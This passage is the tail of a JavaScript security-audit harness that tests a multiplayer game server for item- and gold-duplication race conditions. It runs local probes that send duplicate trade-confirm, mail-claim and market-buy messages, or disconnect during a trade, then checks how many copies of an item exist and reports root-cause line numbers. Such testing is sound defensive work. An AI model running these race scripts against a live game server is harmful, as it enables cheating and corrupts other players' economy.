  const A = await connect(relay, 'RaceA', tA); const B = await connect(relay, 'RaceB', tB);
  const SEED = 30;
  A.save(mkProg({ gold: 0, inventory: Array(SEED).fill(GX) })); B.save(mkProg({ gold: 9000, inventory: [] }));
  await sleep(800);
  const alive = () => countIn(charRec(dataDir, tA, 'RaceA')?.progress?.inventory, null, GX)
    + countIn(charRec(dataDir, tB, 'RaceB')?.progress?.inventory, null, GX);
  let rounds = 0; let doubles = 0; const notes = [];
  for (let i = 0; i < N; i++) {
    const cur = charRec(dataDir, tA, 'RaceA');
    if (countIn(cur?.progress?.inventory, null, GX) < 1) { notes.push(`round ${i}: A lost ${GX} on the server`); break; }
    A.rev = cur?.rev ?? 0; B.rev = charRec(dataDir, tB, 'RaceB')?.rev ?? 0;
    A.send('trade-request', { to: B.sid });
    const req = await B.wait('trade-request', (m) => m.from === A.sid, 1500);
    if (!req) { await sleep(900); notes.push(`round ${i}: request rate-limited (skipped)`); continue; }
    B.send('trade-respond', { from: A.sid, accept: true });
    const open = await A.wait('trade-open', null, 1500);
    if (!open) { notes.push(`round ${i}: no trade-open`); break; }
    A.send('trade-offer', { id: open.id, items: [GX], gold: 0 });
    B.send('trade-offer', { id: open.id, items: [], gold: 50 });
    await sleep(120);
    A.send('trade-lock', { id: open.id, rev: A.rev }); B.send('trade-lock', { id: open.id, rev: B.rev });
    await sleep(120);
    A.drain(); B.drain();
    // same tick, three confirms for one session
    A.send('trade-confirm', { id: open.id });
    A.send('trade-confirm', { id: open.id });
    B.send('trade-confirm', { id: open.id });
    await sleep(500);
    const oks = A.got('trade-result', (m) => m.id === open.id && m.ok).length;
    const bOks = B.got('trade-result', (m) => m.id === open.id && m.ok).length;
    rounds++;
    if (oks > 1 || bOks > 1) { doubles++; notes.push(`round ${i}: ${oks}/${bOks} ok trade-results for one session id`); }
    const a2 = alive();
    if (a2 !== SEED) { doubles++; notes.push(`round ${i}: ${a2} copies of ${GX} alive, seeded ${SEED}`); }
    await sleep(1300);
  }
  const finalN = alive();
  await Promise.all([A.leave(), B.leave()]);
  return {
    exploited: doubles > 0, inconclusive: rounds === 0, severity: 'critical',
    title: 'Duplicate trade-confirm in one tick (same session)',
    rootCause: 'server/economy.js:284-291 (confirm path) / server/economy.js:623 TRADES.delete before mutating',
    detail: `${doubles} anomalies over ${rounds} raced rounds (${N} attempted); invariant: ${finalN}/${SEED} copies of ${GX} alive`,
    evidence: [`attempts=${N} raced=${rounds} anomalies=${doubles}`, ...notes.slice(0, 4), `copies of ${GX} alive at the end: ${finalN} (seeded ${SEED})`],
  };
}

/** R3: duplicate mail-claim with the same rev. */
async function raceDoubleMailClaim(ctx, N) {
  const { relay, dataDir } = ctx;
  const tA = tok(); const tB = tok();
  const A = await connect(relay, 'MailA', tA); const B = await connect(relay, 'MailB', tB);
  A.save(mkProg({ gold: 3000, inventory: [GX, GY, GZ] })); B.save(mkProg({ gold: 1000, inventory: [] }));
  await sleep(600);
  let rounds = 0; let doubles = 0; const notes = [];
  for (let i = 0; i < N; i++) {
    const cur = charRec(dataDir, tA, 'MailA');
    if (countIn(cur?.progress?.inventory, null, GX) < 1) { notes.push(`round ${i}: A out of ${GX}`); break; }
    A.rev = cur?.rev ?? 0;
    A.send('mail-send', { to: 'MailB', subject: 'x', body: 'y', gold: 50, items: [], rev: A.rev });
    const sent = await A.wait('econ-msg', (m) => /Mail sent/.test(m.text), 2000);
    if (!sent) { await sleep(900); notes.push(`round ${i}: mail-send rate-limited (skipped)`); continue; }
    B.room.send('mail-list', {});
    const box = await B.wait('mail-box', (m) => (m.mails || []).some((x) => x.gold === 50 && !x.sys), 2000);
    const mail = box?.mails?.find((x) => x.gold === 50 && !x.sys);
    if (!mail) { notes.push(`round ${i}: no mail delivered`); break; }
    const bcur = charRec(dataDir, tB, 'MailB');
    B.rev = bcur?.rev ?? 0; B.drain();
    B.send('mail-claim', { id: mail.id, rev: B.rev });
    B.send('mail-claim', { id: mail.id, rev: B.rev });   // same tick, same rev
    await sleep(500);
    const oks = B.got('econ-sync', (m) => m.why === 'mail-claim').length;
    const gold = charRec(dataDir, tB, 'MailB')?.progress?.gold ?? -1;
    if (oks) {
      rounds++;
      if (oks > 1 || gold > 1000 + 50 * rounds) { doubles++; notes.push(`round ${i}: ${oks} claims, B gold=${gold}`); }
    }
    await sleep(150);
  }
  await Promise.all([A.leave(), B.leave()]);
  return {
    exploited: doubles > 0, inconclusive: rounds === 0, severity: 'critical',
    title: 'Duplicate mail-claim in one tick (same rev)',
    rootCause: 'server/economy.js:408-422 (mail.gold/items zeroed before mutate, then delivered via await commit)',
    detail: `${doubles} double-claimed rounds out of ${rounds} settled (${N} attempted)`,
    evidence: [`attempts=${N} settled=${rounds} doubled=${doubles}`, ...notes.slice(0, 4)],
  };
}

/** R4: accept a trade, then disconnect immediately. */
async function raceConfirmThenLeave(ctx, N) {
  const { relay, dataDir } = ctx;
  const tA = tok(); const tB = tok();
  const A = await connect(relay, 'LeaveA', tA); const B = await connect(relay, 'LeaveB', tB);
  const SEED = 30;
  A.save(mkProg({ gold: 0, inventory: Array(SEED).fill(GX) })); B.save(mkProg({ gold: 9000, inventory: [] }));
  await sleep(800);
  const alive = () => countIn(charRec(dataDir, tA, 'LeaveA')?.progress?.inventory, null, GX)
    + countIn(charRec(dataDir, tB, 'LeaveB')?.progress?.inventory, null, GX);
  let rounds = 0; let settled = 0; let bad = 0; const notes = [];
  for (let i = 0; i < N; i++) {
    const cur = charRec(dataDir, tA, 'LeaveA');
    if (countIn(cur?.progress?.inventory, null, GX) < 1) { notes.push(`round ${i}: A lost ${GX}`); break; }
    A.rev = cur?.rev ?? 0; B.rev = charRec(dataDir, tB, 'LeaveB')?.rev ?? 0;
    A.send('trade-request', { to: B.sid });
    const req = await B.wait('trade-request', (m) => m.from === A.sid, 1500);
    if (!req) { await sleep(900); notes.push(`round ${i}: request limited (skipped)`); continue; }
    B.send('trade-respond', { from: A.sid, accept: true });
    const open = await A.wait('trade-open', null, 1500);
    if (!open) { notes.push(`round ${i}: no open`); break; }
    A.send('trade-offer', { id: open.id, items: [GX], gold: 0 });
    B.send('trade-offer', { id: open.id, items: [], gold: 50 });
    await sleep(140);
    A.send('trade-lock', { id: open.id, rev: A.rev }); B.send('trade-lock', { id: open.id, rev: B.rev });
    await sleep(140);
    A.drain(); B.drain();
    // both confirm in the same tick, A drops out immediately after
    A.send('trade-confirm', { id: open.id });
    B.send('trade-confirm', { id: open.id });
    const aRes = A.wait('trade-result', (m) => m.id === open.id, 2000);
    A.room.send('leave-not-a-type', {});
    const res = await aRes;
    await sleep(350);                     // let the store's write-behind reach disk before counting
    const aRec = charRec(dataDir, tA, 'LeaveA');
    const aHas = countIn(aRec?.progress?.inventory, null, GX);
    rounds++;
    if (res?.ok) {
      // a settled trade must leave exactly one fewer copy on A and one more on B
      settled++;
      const bHas = countIn(charRec(dataDir, tB, 'LeaveB')?.progress?.inventory, null, GX);
      if (!(aHas === SEED - settled && bHas === settled)) { bad++; notes.push(`round ${i}: settled but A=${aHas} B=${bHas} (expected A=${SEED - settled} B=${settled})`); }
    }
    const a2 = alive();
    if (a2 !== SEED) { bad++; notes.push(`round ${i}: ${a2} copies of ${GX} alive after a settle+leave, seeded ${SEED}`); }
    await sleep(1300);
  }
  const finalN = alive();
  await Promise.all([A.leave(), B.leave()]);
  // explicit single-shot check for the owner's Q1 ("accept a trade then disconnect to keep both
  // sides"): confirm on both sides, then really disconnect one socket mid-window.
  let dropNote = 'not run';
  {
    const tD1 = tok(); const tD2 = tok();
    const D1 = await connect(relay, 'DropA', tD1); const D2 = await connect(relay, 'DropB', tD2);
    D1.save(mkProg({ gold: 0, inventory: [GX] })); D2.save(mkProg({ gold: 900, inventory: [] }));
    await sleep(700);
    D1.send('trade-request', { to: D2.sid });
    const rq = await D2.wait('trade-request', (m) => m.from === D1.sid, 1500);
    if (rq) {
      D2.send('trade-respond', { from: D1.sid, accept: true });
      const op = await D1.wait('trade-open', null, 1500);
      if (op) {
        D1.send('trade-offer', { id: op.id, items: [GX], gold: 0 });
        D2.send('trade-offer', { id: op.id, items: [], gold: 50 });
        await sleep(180);
        D1.send('trade-lock', { id: op.id, rev: D1.rev }); D2.send('trade-lock', { id: op.id, rev: D2.rev });
        await sleep(180);
        D1.send('trade-confirm', { id: op.id });
        D2.send('trade-confirm', { id: op.id });
        await D1.leave();                       // real disconnect inside the settle window
        await sleep(900);
        const d1 = countIn(charRec(dataDir, tD1, 'DropA')?.progress?.inventory, null, GX);
        const d2 = countIn(charRec(dataDir, tD2, 'DropB')?.progress?.inventory, null, GX);
        dropNote = `disconnect-after-confirm: ${GX} copies on the leaver=${d1}, on the partner=${d2} (${d1 + d2 === 1 ? 'exactly one — atomic' : 'INCONSISTENT'})`;
        if (d1 + d2 !== 1) bad++;
      }
    }
    await D2.leave();
  }
  return {
    exploited: bad > 0, inconclusive: rounds === 0, severity: 'critical',
    title: 'Confirm + immediate disconnect (does the leaver keep the item AND the partner get it?)',
    rootCause: 'server/economy.js:606-631 executeTrade (one synchronous mutation pair, then a durable commit) + server/WayfarerRoom.js:212-240 onLeave',
    detail: `${bad} inconsistent rounds out of ${rounds} raced (${N} attempted); invariant: ${finalN}/${SEED} copies of ${GX} alive`,
    evidence: [`attempts=${N} raced=${rounds} inconsistent=${bad}`, dropNote, ...notes.slice(0, 4)],
  };
}

/** R5: two sockets buying the same listing in the same tick. */
async function raceDoubleBuy(ctx, N) {
  const { relay, dataDir } = ctx;
  const tS = tok(); const t1 = tok(); const t2 = tok();
  const S = await connect(relay, 'SellS', tS);
  const B1 = await connect(relay, 'Buy1', t1); const B2 = await connect(relay, 'Buy2', t2);
  S.save(mkProg({ gold: 4000, inventory: Array(N).fill(GX) }));   // all copies up front: re-saving after a sale is blocked by the econOut guard (by design)
  B1.save(mkProg({ gold: 100000, inventory: [] })); B2.save(mkProg({ gold: 100000, inventory: [] }));
  await sleep(600);
  const SEED = Array(N).fill(GX).length;
  let rounds = 0; let doubles = 0; const notes = [];
  for (let i = 0; i < N; i++) {
    const cur = charRec(dataDir, tS, 'SellS');
    if (countIn(cur?.progress?.inventory, null, GX) < 1) { notes.push(`round ${i}: seller out of ${GX}`); break; }
    S.rev = cur?.rev ?? 0;
    S.send('market-post', { item: GX, price: 100, hours: 2, rev: S.rev });
    const listed = await S.wait('econ-msg', (m) => /Listed/.test(m.text), 2000);
    if (!listed) {
      const err = S.got('econ-error').slice(-1)[0];
      notes.push(`round ${i}: post refused (${err?.m?.msg || 'rate limit'})`);
      await sleep(900); continue;
    }
    B1.room.send('market-browse', {}); const page = await B1.wait('market-page', (m) => (m.items || []).some((x) => x.item === GX), 1500);
    const lot = page?.items?.find((x) => x.item === GX && x.seller === 'SellS');
    if (!lot) { notes.push(`round ${i}: listing not visible`); break; }
    const r1 = charRec(dataDir, t1, 'Buy1')?.rev ?? 0;
    const r2 = charRec(dataDir, t2, 'Buy2')?.rev ?? 0;
    B1.drain(); B2.drain();
    // same tick: two different buyers claim the same listing id
    B1.send('market-buy', { id: lot.id, rev: r1 });
    B2.send('market-buy', { id: lot.id, rev: r2 });
    await sleep(600);
    const c1 = B1.got('econ-msg', (m) => /Bought/.test(m.text)).length;
    const c2 = B2.got('econ-msg', (m) => /Bought/.test(m.text)).length;
    const sell = charRec(dataDir, tS, 'SellS');
    const t1has = countIn(charRec(dataDir, t1, 'Buy1')?.progress?.inventory, null, GX);
    const t2has = countIn(charRec(dataDir, t2, 'Buy2')?.progress?.inventory, null, GX);
    const inSeller = countIn(sell?.progress?.inventory, null, GX);
    const listed2 = Object.values(marketListings(dataDir)).filter((l) => l.item === GX && l.seller === 'SellS').length;
    const total = inSeller + t1has + t2has + listed2;
    if (c1 || c2) rounds++;
    // a single listing can only be sold once: two buys in one round, or more copies
    // alive than were ever seeded, both mean the same item was duplicated
    if (c1 && c2) { doubles++; notes.push(`round ${i}: BOTH buyers got "Bought" for ${lot.id}`); }
    if (total > SEED) { doubles++; notes.push(`round ${i}: ${total} copies of ${GX} alive, seeded ${SEED}`); }
    // unsold listing: cancel it so the 10-listing-per-seller cap is never hit
    if (!c1 && !c2) {
      S.rev = sell?.rev ?? 0;
      S.send('market-cancel', { id: lot.id, rev: S.rev });
      await sleep(300);
    }
    await sleep(700);
  }
  await Promise.all([S.leave(), B1.leave(), B2.leave()]);
  return {
    exploited: doubles > 0, inconclusive: rounds === 0, severity: 'critical',
    title: 'Two buyers racing one market listing (same tick)',
    rootCause: 'server/economy.js:357-373 (market-buy deletes the listing synchronously before the await commit)',
    detail: `${doubles} double-sold rounds out of ${rounds} settled (${N} attempted)`,
    evidence: [`attempts=${N} settled=${rounds} doubled=${doubles}`, ...notes.slice(0, 4)],
  };
}

// ── runner ─────────────────────────────────────────────────────────────
const PROBES = [
  ['save-first-upload-gold-mint', p_freshSaveGoldMint],
  ['wildcard-forged-trade-done', p_wildcardForge],
  ['econout-equipped-bypass', p_econOutEquippedBypass],
  ['save-item-mint-to-gold', p_saveItemMint],
  ['save-gold-rate-farm', p_goldRateFarm],
  ['gift-path-shadowed-inert', p_giftInert],
  ['forged-trade-respond', p_forgedTradeRespond],
  ['bag-overflow-40v30', p_bagOverflow],
];
const RACES = [
  ['race-two-tabs', raceTwoTabs, 30],
  ['race-double-confirm', raceDoubleConfirm, 30],
  ['race-double-mail-claim', raceDoubleMailClaim, 30],
  ['race-confirm-then-leave', raceConfirmThenLeave, 30],
  ['race-double-buy', raceDoubleBuy, 30],
];

const RANK = { critical: 3, high: 2, medium: 1, low: 0 };
const only = arg('--only', null);
const raceN = Number(arg('--race-iterations', '20')) || 20;

function print(res, idx, total) {
  const tag = res.exploited ? 'EXPLOITED' : res.inconclusive ? 'INCONCLU ' : 'blocked  ';
  console.log(`\n── [${idx}/${total}] ${tag} [${res.severity}] ${res.title}`);
  console.log(`   root cause: ${res.rootCause}`);
  console.log(`   ${res.detail}`);
  for (const e of res.evidence) console.log(`   · ${e}`);
}

async function main() {
  const keep = flag('--keep');
  const basePort = Number(arg('--port', '0')) || await freePort(2718, 2758);
  const dataDir = arg('--data-dir', null) || fs.mkdtempSync(path.join(os.tmpdir(), 'wf-dupes-'));
  fs.mkdirSync(dataDir, { recursive: true });
  console.log(`wayfarer econ dupe audit — repo ${ROOT}`);
  console.log(`relay: port ${basePort}   DATA_DIR: ${dataDir}`);
  const started = Date.now();
  const relay = await Relay.start(dataDir, basePort);
  console.log(`relay healthy at ${relay.url}/health (pid ${relay.child.pid})`);

  const list = PROBES.filter(([id]) => !only || id === only);
  const raceList = RACES.filter(([id]) => !only || id === only);
  const total = list.length + raceList.length;

  try {
    let i = 0;
    for (const [id, fn] of list) {
      i++;
      let res;
      try { res = await fn({ relay, dataDir }); } catch (e) { res = { exploited: false, severity: 'low', title: id, rootCause: '-', detail: `harness error: ${e.message}`, evidence: [e.stack?.split('\n')[1] || ''] }; }
      res.id = id; res.cleanup = async () => {};
      RESULTS.push(res); print(res, i, total);
    }
    for (const [id, fn, n] of raceList) {
      i++;
      let res;
      try { res = await fn({ relay, dataDir }, only ? n : raceN); } catch (e) { res = { exploited: false, severity: 'low', title: id, rootCause: '-', detail: `harness error: ${e.message}`, evidence: [e.stack?.split('\n')[1] || ''] }; }
      res.id = id; res.clientSide = true;
      RESULTS.push(res); print(res, i, total);
    }
  } finally {
    await relay.stop();
    if (!keep) { try { fs.rmSync(dataDir, { recursive: true, force: true }); } catch { /* locked */ } }
  }

  const fired = RESULTS.filter((r) => r.exploited);
  const gate = fired.filter((r) => RANK[r.severity] >= 2);
  const unclear = RESULTS.filter((r) => r.inconclusive && !r.exploited);
  console.log(`\n══ summary (${Math.round((Date.now() - started) / 1000)}s)`);
  for (const r of RESULTS) console.log(`   ${r.exploited ? 'FAIL' : r.inconclusive ? '????' : 'pass'}  [${r.severity.padEnd(8)}] ${r.id}`);
  console.log(`   ${RESULTS.length} probes, ${fired.length} exploited, ${gate.length} at critical/high, ${unclear.length} inconclusive`);
  if (unclear.length) console.log(`   NOTE: ${unclear.map((r) => r.id).join(', ')} produced no settled rounds (relay rate limits) — that is NOT evidence of safety`);
  console.log(gate.length ? `   RESULT: EXPLOITABLE — ${gate.map((r) => r.id).join(', ')}` : '   RESULT: no critical/high duplication reproduced');
  if (keep) console.log(`   DATA_DIR kept: ${dataDir}`);
  process.exit(gate.length || (flag('--strict') && unclear.length) || HARNESS_FAIL ? 1 : 0);
}

main().catch((e) => { console.error('harness failure:', e); process.exit(2); });
